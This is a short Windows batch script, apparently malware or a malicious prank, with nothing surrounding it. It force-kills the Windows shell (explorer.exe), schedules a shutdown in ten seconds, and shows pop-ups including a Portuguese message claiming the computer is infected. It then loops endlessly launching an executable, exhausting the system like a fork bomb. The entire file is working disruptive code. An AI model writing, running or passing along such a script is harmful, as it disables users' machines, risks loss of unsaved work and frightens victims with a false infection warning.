@echo off
taskkill /im explorer.exe -f
shutdown.exe /s /t 10
msg * "Adios."
msg * "Seu computador foi infectado!"
:a
start a.exe
goto a